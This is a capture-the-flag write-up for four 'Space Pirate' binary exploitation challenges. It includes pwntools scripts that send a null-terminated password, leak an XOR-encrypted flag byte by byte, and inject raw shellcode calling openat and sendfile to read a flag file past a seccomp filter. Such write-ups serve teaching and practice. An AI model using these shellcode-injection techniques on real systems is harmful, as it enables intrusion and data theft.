# Space Pirate: Entry Point

--> *You just need to press 2 and the program will output the flag, pretty boring*

* Or if you choose the hard way, you will need to overwrite some value to an address to get the flag.

# Space Pirate: Going Deeper

* In this challenge, the program will read your input and compare it with a password stored inside the program 
* If you type in the password the normal way, it will simply not work because your input will be appened with an endline character "\n" 

**--> The solution is simple append your input with a "\x00" then send it. Here is a script i wrote in python**

```python
from pwn import *
#p = process('./sp_going_deeper')
p = remote('157.245.33.77',32510)
p.sendlineafter(b'>> ',b'1')
p.sendlineafter(b': ',b'DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\x00')
print(p.recvall())

```

# Space Pirate: Vault Breaker

* A typical encryption scheme, the program will give us the encrypted flag (key ^ flag), so we need to use the **Generate new key** function to zero out the byte we need


```python
from pwn import *

flag = b''

for index in range(0,32):
	p = process('./vault-breaker')
	#p = remote('157.245.33.77',30337)
	p.sendlineafter(b'> ',b'1')
	p.sendlineafter(b': ',str(index).encode())
	p.sendlineafter(b'> ',b'2')
	r = b''
	while b'Master password for Vault:' not in r:	
		r = p.recvline()
	leak = r.split(b': ')[1]
	flag += chr(leak[index]).encode() # Flag[index] is leaked
	print("index = " + str(index),end='      ')
	print(flag.decode())
	print('-----------------------------------------------------------')
	if (flag.endswith(b'}')):
		break
print(f"Flag found: {flag}")
```

* While running this script on both local and remote machine, I encounterd unexpected crash several times. But if i re-ran it, it worked normally. So if you know whats wrong with my script, feel free to message me

# Space Pirate: Fleet Management

* If you disassemble the program, you will see there is a hidden input (9). Upon pressing 9 the program will read our input. With a bit knowledge in reversing, you will realize that the program will treat your input as a sequence of instrunctions and attemp to run it
* But there are restrictions, we can not call system('/bin/sh') because of the seccomp_rule, we are only allowed to execute openat and sendfile, but that's all we need.

```python

from pwn import *

p = remote('178.62.83.221',32008)

payload = b"\x6A\x00\x48\xBB\x66\x6C\x61\x67\x2E\x74\x78\x74\x53\x48\xBF\x9C\xFF\xFF\xFF\x00\x00\x00\x00\x48\x89\xE6\x48\x31\xD2\x48\xC7\xC0\x01\x01\x00\x00\x0F\x05\x48\x31\xFF\x40\xB7\x01\x48\x89\xC6\x4D\x31\xD2\x41\xB2\x1E\x48\x31\xC0\xB0\x28\x0F\x05"
      #  This is a piece of assembly code to invoke openat() and sendfile() which will print out the flag for us. 
      #  You can code it in assembly and then get the byte representation of it through some online assembler. Or you can craft your payload using pwn.shellcraft()
p.sendlineafter(b'do? ',b'9')
p.sendline(payload)
r = p.recvline()
print("Flag: ",r.decode())

```
